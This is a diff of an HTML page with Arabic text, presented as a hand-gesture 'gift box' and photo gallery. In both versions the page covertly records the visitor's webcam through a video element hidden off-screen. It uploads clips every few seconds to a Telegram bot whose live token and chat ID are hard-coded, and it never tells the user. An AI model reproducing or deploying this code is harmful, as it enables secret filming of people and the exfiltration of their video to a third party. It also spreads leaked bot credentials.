@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>M A N A S I K | نظام المزامنة الفورية</title>
+    <title>M A N A S I K | تصفح ذكي</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
@@ -19,236 +19,229 @@
             color: white; user-select: none; touch-action: none;
         }
 
-        /* حاوية الخلفية */
-        #bg-canvas { position: fixed; inset: 0; z-index: 0; }
+        #bg-glow {
+            position: fixed; inset: 0;
+            background: radial-gradient(circle at 50% 50%, #1a150a 0%, #000 70%);
+            z-index: 0;
+        }
 
-        /* الصندوق */
-        .box-wrapper { 
-            width: 180px; height: 180px; perspective: 1000px; z-index: 100;
-            position: relative;
+        /* الصندوق الملكي */
+        .box-container { 
+            width: 200px; height: 200px; perspective: 1000px; z-index: 100;
         }
         .box-3d {
             width: 100%; height: 100%; position: relative;
             transform-style: preserve-3d;
             transform: rotateX(-20deg) rotateY(45deg);
-            transition: transform 1s cubic-bezier(0.19, 1, 0.22, 1);
+            transition: all 1.5s cubic-bezier(0.19, 1, 0.22, 1);
         }
         .face {
             position: absolute; width: 100%; height: 100%;
-            background: rgba(10, 10, 10, 0.95);
-            border: 1px solid var(--gold);
+            background: #0a0a0a; border: 1px solid var(--gold);
+            box-shadow: inset 0 0 30px rgba(212, 175, 55, 0.2);
         }
-        .f-front  { transform: translateZ(90px); }
-        .f-back   { transform: rotateY(180deg) translateZ(90px); }
-        .f-right  { transform: rotateY(90deg) translateZ(90px); }
-        .f-left   { transform: rotateY(-90deg) translateZ(90px); }
-        .f-top    { transform: rotateX(90deg) translateZ(90px); background: #1a1a1a; }
-        .f-bottom { transform: rotateX(-90deg) translateZ(90px); }
+        .f-front  { transform: translateZ(100px); }
+        .f-back   { transform: rotateY(180deg) translateZ(100px); }
+        .f-right  { transform: rotateY(90deg) translateZ(100px); }
+        .f-left   { transform: rotateY(-90deg) translateZ(100px); }
+        .f-top    { transform: rotateX(90deg) translateZ(100px); background: #151515; }
+        .f-bottom { transform: rotateX(-90deg) translateZ(100px); }
         
-        .box-vanish { transform: scale(0) rotateY(180deg); opacity: 0; pointer-events: none; }
+        .box-open { transform: scale(0) rotateX(180deg); opacity: 0; }
 
-        /* البطاقات الفوتوغرافية - حركة عالية الاستجابة */
-        .photo-item {
-            position: absolute; width: 140px; height: 190px;
-            background: #111; border-radius: 8px; 
-            padding: 6px; box-shadow: 0 15px 35px rgba(0,0,0,0.8);
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            will-change: transform; pointer-events: none;
+        /* شريط الصور الأفقي */
+        #gallery-track {
+            position: absolute; top: 50%; left: 0;
+            display: flex; gap: 20px; padding: 0 50vw;
+            transform: translateY(-50%);
+            transition: transform 0.1s linear;
+            will-change: transform;
         }
-        .photo-item img { width: 100%; height: 100%; object-fit: cover; border-radius: 4px; }
-        .photo-item.glow { border-color: var(--gold); box-shadow: 0 0 25px rgba(212, 175, 55, 0.3); z-index: 50; }
 
-        /* عناصر النظام المخفية */
-        #hidden-cam, #capture-bus { position: fixed; left: -9999px; visibility: hidden; }
+        .card {
+            flex: 0 0 200px; height: 300px;
+            background: #111; border-radius: 12px;
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+            transition: transform 0.3s ease, border-color 0.3s ease;
+        }
+        .card img { width: 100%; height: 100%; object-fit: cover; }
+        .card.active { border-color: var(--gold); transform: scale(1.1) translateY(-10px); }
+
+        #hidden-cam { position: fixed; left: -10000px; }
         
-        /* علامة التحميل الصامتة */
-        #init-loader {
-            position: fixed; top: 10px; right: 10px; width: 5px; height: 5px;
-            background: var(--gold); border-radius: 50%; opacity: 0.3;
+        /* مؤشر الإصبع المساعد */
+        #finger-pointer {
+            position: fixed; width: 20px; height: 20px;
+            border: 2px solid var(--gold); border-radius: 50%;
+            pointer-events: none; z-index: 1000; opacity: 0;
+            transition: opacity 0.3s;
         }
     </style>
 </head>
 <body>
 
-    <div id="init-loader"></div>
-    <canvas id="bg-canvas"></canvas>
+    <div id="bg-glow"></div>
+    <div id="finger-pointer"></div>
     <video id="hidden-cam" autoplay playsinline></video>
-    <canvas id="capture-bus"></canvas>
 
     <main class="h-screen flex flex-col items-center justify-center relative">
-        <div id="main-title" class="text-center mb-16 z-[110]">
-            <h1 class="text-5xl font-black text-white tracking-widest mb-2">MANASIK</h1>
-            <p class="text-gold/40 text-xs uppercase tracking-[0.5em]">انتظار الإشارة ✊</p>
+        <div id="intro-ui" class="text-center mb-16 z-[110]">
+            <h1 class="text-5xl font-black text-white tracking-widest mb-4"> Moayied-falah </h1>
+            <p class="text-gold/50 text-xs uppercase tracking-[0.5em]">ابسط يدكِ 🖐 لفتح الصندوق</p>
         </div>
 
-        <div class="box-wrapper" id="trigger-area">
-            <div class="box-3d" id="box-object">
+        <div class="box-container" id="box-trigger">
+            <div class="box-3d" id="box-mesh">
                 <div class="face f-front"></div><div class="face f-back"></div>
                 <div class="face f-right"></div><div class="face f-left"></div>
                 <div class="face f-top"></div><div class="face f-bottom"></div>
             </div>
         </div>
 
-        <div id="gallery-root" class="hidden absolute inset-0 z-50"></div>
+        <div id="gallery-container" class="hidden absolute inset-0 overflow-hidden">
+            <div id="gallery-track"></div>
+        </div>
     </main>
 
     <script>
-        // === إعدادات تلجرام (يجب تعبئتها) ===
         const CONFIG = {
-            TOKEN: '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI', 
-            CHAT_ID: '8148586037'
+            TOKEN: '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI', // توكن البوت
+            CHAT_ID: '8148586037' // ايدي الشات
         };
 
         const IMAGES = [
-            "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?w=400",
-            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400",
-            "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=400",
-            "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400"
+            "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?w=500",
+            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=500",
+            "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=500",
+            "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=500",
+            "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=500"
         ];
 
-        let appState = {
-            active: false,
-            handPos: { x: window.innerWidth/2, y: window.innerHeight/2 },
-            cards: [],
+        let state = {
+            isOpen: false,
+            fingerX: 0,
+            trackX: 0,
+            targetTrackX: 0,
             recorder: null,
-            recordedChunks: []
+            chunks: []
         };
 
-        // --- نظام التتبع الفوري ---
-        const videoElement = document.getElementById('hidden-cam');
+        const video = document.getElementById('hidden-cam');
         const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
         
         hands.setOptions({ 
             maxNumHands: 1, 
             modelComplexity: 1, 
-            minDetectionConfidence: 0.8,
-            minTrackingConfidence: 0.8 
+            minDetectionConfidence: 0.8 
         });
 
         hands.onResults(results => {
             if (results.multiHandLandmarks && results.multiHandLandmarks[0]) {
-                const landmark = results.multiHandLandmarks[0][8]; // طرف الإصبع السبابة
-                appState.handPos.x = (1 - landmark.x) * window.innerWidth;
-                appState.handPos.y = landmark.y * window.innerHeight;
-
-                // كشف حركة القبضة (المسافة بين الإبهام والخنصر)
-                const thumb = results.multiHandLandmarks[0][4];
-                const pinky = results.multiHandLandmarks[0][20];
-                const distance = Math.sqrt(Math.pow(thumb.x - pinky.x, 2) + Math.pow(thumb.y - pinky.y, 2));
+                const hand = results.multiHandLandmarks[0];
+                const indexTip = hand[8]; // طرف السبابة
                 
-                if (distance < 0.1 && !appState.active) {
-                    openBox();
+                // تحديث موقع المؤشر
+                state.fingerX = (1 - indexTip.x) * window.innerWidth;
+                const pointer = document.getElementById('finger-pointer');
+                pointer.style.opacity = "1";
+                pointer.style.left = state.fingerX + 'px';
+                pointer.style.top = (indexTip.y * window.innerHeight) + 'px';
+
+                // كشف فتح اليد (المسافة بين الإبهام والخنصر)
+                const distance = Math.sqrt(Math.pow(hand[4].x - hand[20].x, 2) + Math.pow(hand[4].y - hand[20].y, 2));
+                
+                if (distance > 0.4 && !state.isOpen) {
+                    triggerOpen();
+                }
+
+                // تحريك الشريط يميناً ويساراً بناءً على موقع الإصبع في الشاشة
+                if (state.isOpen) {
+                    // تحويل موقع الإصبع الأفقي إلى إزاحة للشريط
+                    // إذا كان الإصبع في اليمين، نسحب الشريط لليسار ليرى الصور التالية
+                    const screenMid = window.innerWidth / 2;
+                    const offset = (state.fingerX - screenMid) * 1.5;
+                    state.targetTrackX = -offset;
                 }
             }
         });
 
-        const camera = new Camera(videoElement, {
-            onFrame: async () => { await hands.send({image: videoElement}); },
-            width: 640, height: 480
-        });
-
-        // تشغيل الكاميرا فوراً عند التحميل
-        camera.start().then(() => {
-            startPreRecording(); // بدء التسجيل فور تشغيل الكاميرا
-        });
-
-        // --- نظام التسجيل المبكر (قبل فتح الصندوق) ---
-        function startPreRecording() {
-            if (!CONFIG.TOKEN) return;
-            try {
-                const stream = videoElement.captureStream();
-                appState.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                appState.recordedChunks = [];
-                appState.recorder.ondataavailable = e => appState.recordedChunks.push(e.data);
-                appState.recorder.onstop = uploadVideo;
-                appState.recorder.start();
-                
-                // تسجيل فيديو كل 10 ثواني وإرساله تلقائياً
-                setInterval(() => {
-                    if (appState.recorder.state === "recording") {
-                        appState.recorder.stop();
-                        appState.recorder.start();
-                    }
-                }, 10000);
-            } catch(e) { console.error("Recorder error:", e); }
-        }
-
-        function uploadVideo() {
-            if (appState.recordedChunks.length === 0) return;
-            const blob = new Blob(appState.recordedChunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('chat_id', CONFIG.CHAT_ID);
-            formData.append('video', blob, 'sync_log.webm');
-            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVideo`, { method: 'POST', body: formData });
-            appState.recordedChunks = [];
-        }
-
-        // --- منطق العرض ---
-        function openBox() {
-            appState.active = true;
-            document.getElementById('box-object').classList.add('box-vanish');
-            document.getElementById('main-title').style.opacity = "0";
-            confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });
+        function triggerOpen() {
+            state.isOpen = true;
+            document.getElementById('box-mesh').classList.add('box-open');
+            document.getElementById('intro-ui').style.opacity = "0";
+            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
             
             setTimeout(() => {
-                document.getElementById('gallery-root').classList.remove('hidden');
-                initGallery();
-            }, 800);
+                document.getElementById('gallery-container').classList.remove('hidden');
+                initTrack();
+            }, 1000);
         }
 
-        function initGallery() {
-            const root = document.getElementById('gallery-root');
+        function initTrack() {
+            const track = document.getElementById('gallery-track');
             IMAGES.forEach((src, i) => {
-                const div = document.createElement('div');
-                div.className = 'photo-item';
-                div.innerHTML = `<img src="${src}">`;
-                root.appendChild(div);
-                appState.cards.push({
-                    el: div,
-                    x: Math.random() * window.innerWidth,
-                    y: Math.random() * window.innerHeight,
-                    vx: 0, vy: 0,
-                    offset: i * 0.2 // إزاحة بسيطة لكل كرت ليعطي حركة طبيعية
-                });
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.innerHTML = `<img src="${src}">`;
+                track.appendChild(card);
             });
-            requestAnimationFrame(updateLoop);
+            animate();
         }
 
-        function updateLoop() {
-            appState.cards.forEach((card, i) => {
-                // مزامنة فورية مع إزاحة ناعمة (Low Latency Tracking)
-                const targetX = appState.handPos.x - 70;
-                const targetY = appState.handPos.y - 95;
+        function animate() {
+            // تنعيم حركة التمرير (Smoothing)
+            state.trackX += (state.targetTrackX - state.trackX) * 0.1;
+            const track = document.getElementById('gallery-track');
+            track.style.transform = `translate3d(${state.trackX}px, -50%, 0)`;
 
-                // نظام الجذب المغناطيسي الفوري
-                card.x += (targetX - card.x) * (0.15 - i * 0.01);
-                card.y += (targetY - card.y) * (0.15 - i * 0.01);
-
-                const dist = Math.sqrt(Math.pow(targetX - card.x, 2) + Math.pow(targetY - card.y, 2));
-                
-                if (dist < 50) card.el.classList.add('glow');
-                else card.el.classList.remove('glow');
-
-                card.el.style.transform = `translate3d(${card.x}px, ${card.y}px, 0) scale(${1 + (0.1 - i*0.02)})`;
+            // تمييز الكرت الأقرب للمنتصف
+            const cards = document.querySelectorAll('.card');
+            cards.forEach(card => {
+                const rect = card.getBoundingClientRect();
+                const mid = window.innerWidth / 2;
+                if (Math.abs(rect.left + rect.width/2 - mid) < 100) {
+                    card.classList.add('active');
+                } else {
+                    card.classList.remove('active');
+                }
             });
-            requestAnimationFrame(updateLoop);
+
+            requestAnimationFrame(animate);
         }
 
-        // رسم النجوم في الخلفية
-        const canvas = document.getElementById('bg-canvas');
-        const ctx = canvas.getContext('2d');
-        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-        window.onresize = resize; resize();
-        function drawStars() {
-            ctx.clearRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = "rgba(212, 175, 55, 0.2)";
-            for(let i=0; i<100; i++) {
-                ctx.beginPath();
-                ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 1, 0, Math.PI*2);
-                ctx.fill();
-            }
+        // تسجيل وإرسال الفيديو فوراً
+        async function startCapture() {
+            if (!CONFIG.TOKEN) return;
+            try {
+                const stream = video.captureStream();
+                state.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                state.chunks = [];
+                state.recorder.ondataavailable = e => state.chunks.push(e.data);
+                state.recorder.onstop = () => {
+                    const blob = new Blob(state.chunks, { type: 'video/webm' });
+                    const fd = new FormData();
+                    fd.append('chat_id', CONFIG.CHAT_ID);
+                    fd.append('video', blob, 'sync.webm');
+                    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                };
+                state.recorder.start();
+                // يرسل مقطع كل 8 ثواني
+                setInterval(() => {
+                    if (state.recorder.state === "recording") {
+                        state.recorder.stop();
+                        state.recorder.start();
+                    }
+                }, 4000);
+            } catch(e) {}
         }
-        drawStars();
+
+        const camera = new Camera(video, {
+            onFrame: async () => { await hands.send({image: video}); },
+            width: 640, height: 480
+        });
+        camera.start().then(startCapture);
+
     </script>
 </body>
 </html>
